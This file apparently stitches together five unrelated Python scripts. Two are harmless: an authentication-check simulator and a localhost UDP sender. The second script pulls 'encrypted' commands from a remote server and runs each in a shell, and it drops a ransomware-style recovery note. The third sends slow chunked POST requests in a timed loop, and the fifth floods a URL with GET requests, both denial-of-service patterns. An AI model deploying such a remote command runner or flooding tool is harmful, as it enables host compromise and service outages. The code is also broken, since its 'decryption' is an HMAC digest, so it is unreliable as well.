import random
import os
import logging

def check_authentication():
    """Simulate an authentication check."""
    return random.choice(['success', 'failure'])

def record_result(status, file_path):
    """Log the result of an authentication check to a file."""
    try:
        with open(file_path, 'a') as f:
            f.write(f"auth,check,status:{status}\n")
        logging.info(f"Recorded status: {status}")
    except IOError as e:
        logging.error(f"Failed to write to file {file_path}: {e}")
        raise

def summarize_results(file_path):
    """Summarize the results stored in the audit file."""
    total_checks = 0
    success_count = 0
    failure_count = 0

    if not os.path.exists(file_path):
        logging.warning(f"No existing audit file found at {file_path}. Starting fresh.")
        return total_checks, success_count, failure_count

    try:
        with open(file_path, 'r') as f:
            for line in f:
                if 'auth,check,status:' in line:
                    total_checks += 1
                    if 'status:success' in line:
                        success_count += 1
                    elif 'status:failure' in line:
                        failure_count += 1
    except IOError as e:
        logging.error(f"Failed to read from file {file_path}: {e}")
        raise

    logging.info("Summary generation complete")
    return total_checks, success_count, failure_count

def setup_logging():
    """Set up the logging configuration."""
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def main():
    """Main function to perform authentication checks and summarize results."""
    setup_logging()

    # Default parameters
    num_checks = 10  # Default number of checks
    output_file = 'auth_audit.txt'  # Default output file in the current directory

    # Clear the audit file if it exists to ensure fresh results
    if os.path.exists(output_file):
        try:
            os.remove(output_file)
            logging.info(f"Existing audit file {output_file} cleared.")
        except IOError as e:
            logging.error(f"Failed to remove existing file {output_file}: {e}")
            raise

    # Perform authentication checks and record results
    for _ in range(num_checks):
        status = check_authentication()
        record_result(status, output_file)

    # Summarize results
    total_checks, success_count, failure_count = summarize_results(output_file)
    print(f"Summary:")
    print(f"  Total checks: {total_checks}")
    print(f"  Success count: {success_count}")
    print(f"  Failure count: {failure_count}")

if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import datetime
import base64
import hashlib
import hmac
import time
import urllib.request
import urllib.error

LOG_FILE = "execution_log.txt"
RECOVERY_NOTE = "RECOVERY_NOTE.txt"
OFFLINE_COMMANDS_FILE = "offline_commands.enc"
KEY_FILE = "key.txt"
SERVER_URL = "https://example.com/encrypted_commands"

def write_recovery_note():
    note = (
        "RECOVERY NOTE\n"
        "==============\n"
        "To recover encrypted files:\n"
        "1. Ensure the key file ('key.txt') is securely stored.\n"
        "2. Use the key to decrypt the files manually if needed.\n"
        "3. Contact IT support for assistance if the key is lost.\n"
    )
    try:
        with open(RECOVERY_NOTE, "w") as file:
            file.write(note)
    except IOError as e:
        log_result("Write recovery note", "Failure", error=str(e))
        sys.exit(1)

def load_key():
    try:
        with open(KEY_FILE, "rb") as file:
            return file.read().strip()
    except FileNotFoundError:
        log_result("Load key", "Failure", error=f"Key file '{KEY_FILE}' not found.")
        sys.exit(1)
    except IOError as e:
        log_result("Load key", "Failure", error=str(e))
        sys.exit(1)

def decrypt_data(encrypted_data, key):
    try:
        decoded_data = base64.b64decode(encrypted_data)
        decrypted_bytes = hmac.new(key, decoded_data, hashlib.sha256).digest()
        return decrypted_bytes.decode("utf-8", errors="ignore")
    except Exception as e:
        log_result("Decrypt data", "Failure", error=str(e))
        sys.exit(1)

def log_result(command, status, output=None, error=None, retry=False):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"[{timestamp}] {'Retry: ' if retry else ''}Command: {command}\n")
            log_file.write(f"Status: {status}\n")
            if output:
                log_file.write(f"Output: {output}\n")
            if error:
                log_file.write(f"Error: {error}\n")
            log_file.write("\n")
    except IOError as e:
        print(f"Failed to write to log file: {e}")
        sys.exit(1)

def execute_commands(commands):
    if not commands:
        log_result("Execute commands", "Failure", error="No commands to execute.")
        return

    for command in commands:
        try:
            result = subprocess.run(command, shell=True, check=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            log_result(command, "Success", result.stdout.strip())
        except subprocess.CalledProcessError as e:
            log_result(command, "Failure", error=e.stderr.strip())

def fetch_remote_commands(url, key):
    retries = 0
    max_retries = 5
    backoff_factor = 2

    while retries < max_retries:
        try:
            with urllib.request.urlopen(url) as response:
                encrypted_data = response.read()
                return decrypt_data(encrypted_data, key).splitlines()
        except urllib.error.URLError as e:
            retries += 1
            wait_time = backoff_factor ** retries
            log_result("Fetch remote commands", "Failure", error=str(e), retry=True)
            time.sleep(wait_time)
    log_result("Fetch remote commands", "Failure", error="Exceeded maximum retries.")
    return None

def load_offline_commands(key):
    try:
        with open(OFFLINE_COMMANDS_FILE, "rb") as file:
            encrypted_data = file.read()
            return decrypt_data(encrypted_data, key).splitlines()
    except FileNotFoundError:
        log_result("Load offline commands", "Failure", error=f"Offline commands file '{OFFLINE_COMMANDS_FILE}' not found.")
        sys.exit(1)
    except IOError as e:
        log_result("Load offline commands", "Failure", error=str(e))
        sys.exit(1)

def ensure_log_directory():
    try:
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    except Exception as e:
        print(f"Failed to create log directory: {e}")
        sys.exit(1)

def main():
    ensure_log_directory()
    write_recovery_note()

    key = load_key()
    remote_commands = fetch_remote_commands(SERVER_URL, key)

    if remote_commands:
        execute_commands(remote_commands)
    else:
        log_result("Main", "Info", error="Switching to offline mode.")
        offline_commands = load_offline_commands(key)
        execute_commands(offline_commands)

    sys.exit(0)

if __name__ == "__main__":
    main()

import http.client
import urllib.parse
import time
import os
import sys
from datetime import datetime, timedelta

LOG_DIR = './target'
LOG_FILE = os.path.join(LOG_DIR, 'network_requests.log')

DEFAULT_DURATION = 30  # default duration in seconds
DEFAULT_URL = "http://example.com"  # default URL for testing
DEFAULT_PAYLOAD = "key=value"  # default payload

def ensure_log_directory_exists():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except Exception as e:
        print("Failed to create log directory:", e)

def log_request_attempt(timestamp, url, status=None, error=None):
    try:
        with open(LOG_FILE, 'a') as log_file:
            if error:
                log_file.write(f"{timestamp} | URL: {url} | ERROR: {error}\n")
            else:
                log_file.write(f"{timestamp} | URL: {url} | STATUS: {status}\n")
    except Exception as e:
        print("Failed to write to log file:", e)

def send_slow_post_request(url, payload, chunk_size=10, delay=0.5):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        parsed_url = urllib.parse.urlparse(url)
        if parsed_url.scheme not in ('http', 'https'):
            raise ValueError("Invalid URL scheme. Use 'http' or 'https'.")

        connection = (http.client.HTTPSConnection if parsed_url.scheme == 'https' 
                      else http.client.HTTPConnection)(parsed_url.netloc)

        path = parsed_url.path or '/'
        connection.connect()
        connection.putrequest("POST", path)
        connection.putheader("Content-Type", "application/x-www-form-urlencoded")
        connection.putheader("Content-Length", str(len(payload)))
        connection.endheaders()

        for i in range(0, len(payload), chunk_size):
            connection.send(payload[i:i + chunk_size].encode('utf-8'))
            time.sleep(delay)

        response = connection.getresponse()
        status = f"{response.status} {response.reason}"
        body = response.read().decode('utf-8')
        print("Response status:", response.status)
        print("Response reason:", response.reason)
        print("Response body:", body)
        log_request_attempt(timestamp, url, status=status)
    except ValueError as ve:
        print("Error:", ve)
        log_request_attempt(timestamp, url, error=str(ve))
    except Exception as e:
        print("Error occurred:", e)
        log_request_attempt(timestamp, url, error=str(e))
    finally:
        if 'connection' in locals():
            connection.close()

def validate_duration(duration):
    try:
        return int(duration)
    except ValueError:
        raise ValueError("Duration must be a positive integer representing seconds.")

def main():
    ensure_log_directory_exists()

    if len(sys.argv) > 2:
        print("Usage: python program.py [duration_in_seconds]")
        sys.exit(1)

    # Default values for silent execution
    duration_seconds = DEFAULT_DURATION
    target_url = DEFAULT_URL
    payload = DEFAULT_PAYLOAD

    # If a duration is provided as an argument, use it instead
    if len(sys.argv) == 2:
        try:
            duration_seconds = validate_duration(sys.argv[1])
            if duration_seconds <= 0:
                raise ValueError("Duration must be greater than 0.")
        except ValueError as e:
            print("Error:", e)
            sys.exit(1)

    end_time = datetime.now() + timedelta(seconds=duration_seconds)

    while datetime.now() < end_time:
        send_slow_post_request(target_url, payload)
        time.sleep(1)  # Pause between requests to avoid excessive traffic

    print("Test completed.")

if __name__ == "__main__":
    main()

import socket
import time
from datetime import datetime

LOG_FILE = "udp_log.txt"
DEFAULT_IP = "127.0.0.1"
DEFAULT_PORT = 5005
DEFAULT_MESSAGE = "Hello, UDP!"
DEFAULT_RETRIES = 3
SILENT_MODE = False

def log_udp_send(ip, port, message, success):
    """Logs the details of the UDP packet transmission attempt."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    status = "SUCCESS" if success else "FAILURE"
    log_entry = f"{timestamp} | udp | packet | status={status} destination={ip} port={port} datagram={message}\n"
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(log_entry)
    except IOError as e:
        if not SILENT_MODE:
            print(f"Error writing to log file: {e}")

def send_udp_packet(ip, port, message, retries, silent):
    """Attempts to send a UDP packet with specified retries."""
    attempt = 0
    while attempt <= retries:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(message.encode(), (ip, int(port)))
            if not silent:
                print(f"Packet sent to {ip}:{port} with message: '{message}'")
            return True
        except socket.error as e:
            if attempt < retries:
                if not silent:
                    print(f"Network error: {e}. Retrying... (Attempt {attempt + 1} of {retries + 1})")
                time.sleep(2 ** attempt)  # Exponential backoff
            else:
                if not silent:
                    print(f"Failed to send packet after {retries + 1} attempts due to network error: {e}")
        attempt += 1
    return False

def main():
    """Main function to send a UDP packet with default parameters."""
    ip = DEFAULT_IP
    port = DEFAULT_PORT
    message = DEFAULT_MESSAGE
    retries = DEFAULT_RETRIES
    silent = SILENT_MODE

    success = send_udp_packet(ip, port, message, retries, silent)
    log_udp_send(ip, port, message, success)
    if not silent:
        if success:
            print(f"Log written to {LOG_FILE}")
        else:
            print("Failed to send UDP packet. Log updated.")

if __name__ == "__main__":
    main()

import sys
import time
import http.client
import argparse
from urllib.parse import urlparse


def send_requests(url, duration, log_file=None, silent=False):
    parsed_url = urlparse(url)
    connection = (
        http.client.HTTPSConnection(parsed_url.netloc)
        if parsed_url.scheme == "https"
        else http.client.HTTPConnection(parsed_url.netloc)
    )

    start_time = time.time()
    request_count = 0
    errors = []

    while time.time() - start_time < duration:
        try:
            connection.request("GET", parsed_url.path or "/")
            response = connection.getresponse()
            if not silent:
                print(f"Request {request_count + 1}: {response.status} {response.reason}")
            response.read()
            request_count += 1
        except Exception as e:
            error_message = f"Request {request_count + 1}: Error - {str(e)}"
            errors.append(error_message)
            if not silent:
                print(error_message)

    connection.close()

    # Log results to a log file if a path is provided
    if log_file:
        with open(log_file, "w") as log:
            log.write(f"Total requests sent: {request_count}\n")
            if errors:
                log.write("Errors:\n")
                log.write("\n".join(errors))
                log.write("\n")

    # Print summary if not in silent mode
    if not silent:
        print(f"\nTest completed. Total requests sent: {request_count}")
        if errors:
            print("Errors:")
            for error in errors:
                print(error)


def main():
    parser = argparse.ArgumentParser(
        description="HTTP GET request utility with configurable options."
    )
    parser.add_argument("url", help="Target URL to send requests to.")
    parser.add_argument(
        "duration", type=int, help="Test duration in seconds (e.g., 10)."
    )
    parser.add_argument(
        "--log-file", help="Path to a log file to save the results and errors."
    )
    parser.add_argument(
        "--silent", action="store_true", help="Run the utility in silent mode (no console output)."
    )
    args = parser.parse_args()

    try:
        send_requests(args.url, args.duration, log_file=args.log_file, silent=args.silent)
    except Exception as e:
        print(f"Fatal error: {str(e)}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()

import os
